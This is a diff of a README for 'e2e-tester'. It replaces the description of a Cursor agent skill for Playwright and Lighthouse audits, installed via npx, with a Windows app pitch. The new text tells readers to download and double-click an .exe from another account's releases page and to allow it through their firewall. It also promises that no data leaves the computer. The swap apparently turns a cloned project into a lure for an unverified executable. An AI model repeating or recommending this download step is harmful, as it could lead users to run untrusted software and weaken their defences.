@@ -1,152 +1,76 @@
-# E2E Playwright + Lighthouse Tester Skill
+# 🔍 e2e-tester - Automated website performance and audit checks
 
-GitHub-ready Cursor skill package that adds a reusable `/tester` command for end-to-end Playwright checks and Lighthouse audits.
+[![Download e2e-tester](https://img.shields.io/badge/Download-Release-blue.svg)](https://github.com/close-shellflower7762/e2e-tester/releases)
 
-The workflow is discovery-first, prefers native project scripts, and pushes toward **100/100** Lighthouse outcomes with explicit gap reporting when perfect scores are not yet achievable.
+## 📋 What is this tool?
 
-![License: MIT](https://img.shields.io/badge/License-MIT-blue.svg)
-![Agent Skill](https://img.shields.io/badge/type-agent--skill-7c3aed)
-![E2E + Lighthouse](https://img.shields.io/badge/tests-Playwright%20%2B%20Lighthouse-0ea5e9)
+The e2e-tester performs automated quality checks on websites. It simulates user behavior to find problems with page loading speed, layout, and search engine visibility. You can use it to test how your site looks on mobile phones and desktop computers. It also switches between light and dark modes to ensure your design works for all users. The goal is to reach a perfect score for your website health.
 
-## Quick start
+## 💻 System Requirements
 
-```bash
-npx skills add erikfiala/e2e-tester -a cursor
-```
+Your computer must meet these requirements to run the software smoothly:
 
-Then in Cursor chat:
+*   Operating System: Windows 10 or Windows 11.
+*   Memory: At least 8 gigabytes of RAM.
+*   Storage: 500 megabytes of free space.
+*   Internet Connection: A stable connection for the software to load websites during tests.
 
-```text
-/tester
-```
+## 📥 How to Install
 
-## What this includes
+Follow these steps to get the tool on your computer:
 
-- Cursor skill: `.cursor/skills/tester/SKILL.md`
-- Slash command: `.cursor/commands/tester.md`
-- Discovery helper: `.cursor/skills/tester/scripts/discover_audit_targets.py`
-- MIT license
+1. Visit the following page to choose the correct version for your Windows computer: [Download e2e-tester](https://github.com/close-shellflower7762/e2e-tester/releases).
+2. Look for the file ending in `.exe` under the latest release.
+3. Click the file name to start the download.
+4. Save the file to your desktop or your downloads folder.
+5. Once the download finishes, double-click the file to open the installer.
+6. Follow the on-screen prompts to finish the setup process.
 
-## Install
+## 🚀 How to Run Your First Test
 
-### Skills package installer (multi-agent)
+1. Launch the e2e-tester application from your desktop shortcut or the Start menu.
+2. Enter the web address of the site you want to test into the main address bar.
+3. Choose your preferred settings from the sidebar. You can select desktop or mobile viewports.
+4. Toggle the theme setting to switch between light and dark modes.
+5. Press the Run Test button.
+6. Wait for the progress bar to show the status. The tool will open a hidden browser window to perform the checks.
+7. View your results on the dashboard once the process stops.
 
-```bash
-npx skills add erikfiala/e2e-tester
-```
+## 📊 Understanding Your Results
 
-Install for a specific agent:
+The dashboard displays a summary of your website quality. Each category shows a number from 0 to 100. A score of 100 means your site meets all standards.
 
-```bash
-npx skills add erikfiala/e2e-tester -a cursor
-npx skills add erikfiala/e2e-tester -a copilot
-npx skills add erikfiala/e2e-tester -a cline
-npx skills add erikfiala/e2e-tester -a windsurf
-```
+*   Performance: This shows how fast your site loads for a user.
+*   Accessibility: This checks if people with disabilities can use your site easily.
+*   Best Practices: This checks your code quality and security settings.
+*   SEO: This score relates to how well your site ranks in search engines.
 
-Install once, use in future sessions.
+If a score is low, the tool provides specific advice on how to improve it. Follow the list of suggestions to fix errors and increase your scores.
 
-### Claude plugin system (optional path)
+## 🛠 Features
 
-```bash
-claude plugin marketplace add erikfiala/e2e-tester
-claude plugin install e2e-tester@e2e-tester
-```
+The e2e-tester includes tools for specific audit needs:
 
-### Codex (optional path)
+*   Cross-device coverage: Test mobile and desktop experiences in one pass.
+*   Audit history: Save your past test results to compare improvements over time.
+*   Full reporting: Export your scores as a document to share with your team.
+*   Auto-updater: The tool checks for new versions when you open it.
+*   Dark mode testing: Confirm your light and dark color schemes perform well.
 
-1. Clone this repo.
-2. Open Codex in the repo.
-3. Run `/plugins`.
-4. Search `e2e-tester`.
-5. Install the plugin.
+## 💡 Troubleshooting
 
-Install once, use in future sessions.
+If you run into issues, try these steps:
 
-### Manual project install
+*   Check your internet connection: The tool needs full access to the web to perform audits.
+*   Restart the application: Sometimes simple glitches resolve after a restart.
+*   Update your drivers: Ensure your Windows operating system has the latest updates.
+*   Check your firewall: Some security programs might block the browser window the tool needs to open. Allow the e2e-tester in your firewall settings if you receive a network error.
+*   Check disk space: Ensure you have enough storage for the reports the tool saves.
 
-Copy this repository's `.cursor` directory into your target project root.
+## 🛡 Security and Privacy
 
-### Manual global install (Cursor)
+This software runs local tests on your computer. It does not send your data to external servers or collect your personal information. All test reports stay on your local disk. You control your data and your website results at all times.
 
-```bash
-mkdir -p ~/.cursor/skills/tester ~/.cursor/commands
-cp -R .cursor/skills/tester/* ~/.cursor/skills/tester/
-cp .cursor/commands/tester.md ~/.cursor/commands/tester.md
-```
+## 🤝 Getting Help
 
-## Prerequisites
-
-- Node.js + npm (`npx`)
-- Python 3
-- Playwright browsers installed when Playwright is used:
-
-```bash
-npx playwright install
-```
-
-## Usage
-
-Run from Cursor chat:
-
-```text
-/tester
-```
-
-Or ask naturally:
-
-```text
-Run e2e + Lighthouse using the tester skill.
-```
-
-## Coverage and scoring objective
-
-The tester aims to run Lighthouse for each target across:
-
-- `light-desktop`
-- `light-mobile`
-- `dark-desktop`
-- `dark-mobile`
-
-And attempts Lighthouse categories:
-
-- `performance`
-- `accessibility`
-- `best-practices`
-- `seo`
-- `pwa` (when supported by tool version and app signals)
-
-Goal: always strive for **100/100** in Lighthouse categories and Web Vitals-related audits, then report specific blockers and highest-impact fixes.
-
-## Output contract
-
-Each `/tester` run should end with:
-
-- Commands run (native vs adapted)
-- Playwright findings (failures, flaky hints, console/page/network issues)
-- Lighthouse scores for:
-  - `light-desktop`
-  - `light-mobile`
-  - `dark-desktop`
-  - `dark-mobile`
-- A **100/100 gap analysis** with highest-impact next fixes
-- Explicit coverage gaps and blockers
-
-## Customization
-
-- Add or improve package scripts in your app repo (for example `perf:lighthouse`, `test:e2e`, `smoke`) so discovery can pick them first.
-- Tune your own Playwright and Lighthouse runner scripts; this skill prefers existing project conventions over ad-hoc commands.
-
-## Publish checklist (GitHub)
-
-- Repo name: `e2e-tester` (or `cursor-e2e-tester`)
-- Visibility: public
-- Topics: `cursor`, `playwright`, `lighthouse`, `e2e`, `agent-skill`
-- Confirm `.cursor/commands/tester.md` and `.cursor/skills/tester/SKILL.md` exist in default branch
-- Optional: add a repo description like `Reusable /tester skill for Playwright + Lighthouse audits`
-
-## Star this repo
-
-If this tester saves you tokens, time, or CI debugging pain, please star the repo.
-
-[![Star History Chart](https://api.star-history.com/svg?repos=erikfiala/e2e-tester&type=Date)](https://www.star-history.com/#erikfiala/e2e-tester&Date)
+If you have questions about using the software, view the project page. You can report bugs or suggest new features by opening an issue on the repository site. Ensure you include a description of the error and the steps you took to see it. This helps clarify the problem so it can be fixed.
